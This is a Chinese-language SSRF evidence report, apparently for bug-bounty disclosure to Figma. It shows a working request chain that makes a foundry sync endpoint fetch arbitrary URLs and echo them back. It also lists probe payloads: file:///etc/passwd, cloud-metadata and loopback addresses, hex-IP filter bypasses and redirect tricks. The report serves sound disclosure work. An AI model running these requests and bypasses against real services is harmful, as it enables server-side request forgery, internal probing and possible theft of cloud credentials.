# foundry sync downloadUrl SSRF — 证据链(2026-08-12)

## 发现概述
`POST /api/cortex/foundry/sync` 的 `vfsChangeByPath[*].entry.downloadUrl` 字段:
服务端以服务器身份 fetch 任意公网 HTTP(S) URL,响应内容写入沙箱 VFS 文件,
可通过 `POST /api/cortex/foundry/fs-snapshot`(content:"snapshot")完整回显。

## 利用链
```
1. POST /api/cortex/foundry/sandbox  {}   → sboxdUrl
2. POST /api/cortex/foundry/sync
   {"vfsChangeByPath": {"k": {"type":"upsert",
      "entry": {"path":"code/DL0.txt","downloadUrl":"https://httpbin.org/robots.txt",
                "metadata":{"version":"1","guid":"g1"}}}},
    "entrypointsByIdentifier": {}}
   → 200 {"syncTotalDuration":388,"fileSyncDuration":382,...}
3. POST /api/cortex/foundry/fs-snapshot
   {"sboxdUrl":..., "path":"code/src/code/DL0.txt", "options":{"content":"snapshot"}}
   → SSE 流 content(base64) = "User-agent: *\nDisallow: /deny\n"
```

## 确认行为
| 目标 | 结果 | 耗时 | 说明 |
|---|---|---|---|
| https://httpbin.org/robots.txt | ✅ 内容回显 | 382ms | 服务端真实 fetch |
| file:///etc/passwd | ❌ 未落盘 | ~0ms | 非 http(s) 协议拒绝 |
| http://169.254.169.254/latest/meta-data/ | ❌ | ~13ms | 网络层隔离(非字符串过滤) |
| http://0xa9fea9fe/latest/meta-data/ (hex) | ❌ | 13ms | IMDS 无法达 |
| http://127.0.0.1:8080/ | ❌ | 8ms | 端口无服务 |
| http://0x7f000001:8000..10250 (hex, 13端口) | ❌ | 1.5s 超时 | 本机无 HTTP 服务 |
| httpbin redirect → http://169.254.169.254/ | ❌ | 94ms | 重定向后仍隔离 |
| httpbin redirect → http://127.0.0.1/ | ❌ | 1722ms | 重定向目标直连超时 |
| http://169.254.169.254.nip.io/... | ❌ | 420ms | DNS 可达但连接失败 |

## 关键判断
- 直连字面量 IP(127.0.0.1/169.254.169.254)→ 立即失败(前置校验)
- **十六进制/十进制 IP 编码绕过了前置校验**,进入真实连接路径(1.5s connect timeout)
- 但网络层对 link-local/回环地址无服务可连;IMDS 明确不可达
- 结论:**公网任意 URL 服务端请求+回显成立;内网/云元数据不可达**

## 影响评估
- 服务端 IP 访问公网受限资源(地理限制/ACL/IP 白名单 API)
- 可下载任意公网内容注入沙箱文件系统(存储污染)
- 若 Figma 网络环境变化(内网可达),可升级为内网扫描/云凭证泄露
- 参考评级:Low–Medium(待 Figma 确认 downloader 执行环境)

## schema 来源
js_editor/1037-5e6059a4815311b3.min.js 模块 136858(位置 ~11839778):
```js
k=z.union([{type:literal("upsert"),entry:w},{type:literal("delete"),entry:C}])
w=z.union([S,T])
S=z.object({path,contents,metadata:E})            // contents 直接写入
T=z.object({path,downloadUrl,metadata:E})         // downloadUrl 服务端 fetch
E=z.object({version:string,guid:string,...})      // version+guid 必填
P=sync 请求 = z.object({routingKey?,...d,entrypointsByIdentifier:record(string),
  vfsChangeByPath:record(k)?,filePathToMetadata?,...})
```

## 备注
- 落盘规则:entry.path "code/X" → VFS "code/src/code/X"(VFS 根=code/src/,自动加前缀)
- 任何含 ".." 的 path 被静默拦截(200 但不落盘)
- key 字段(record 键)与落盘无关,entry.path 决定位置
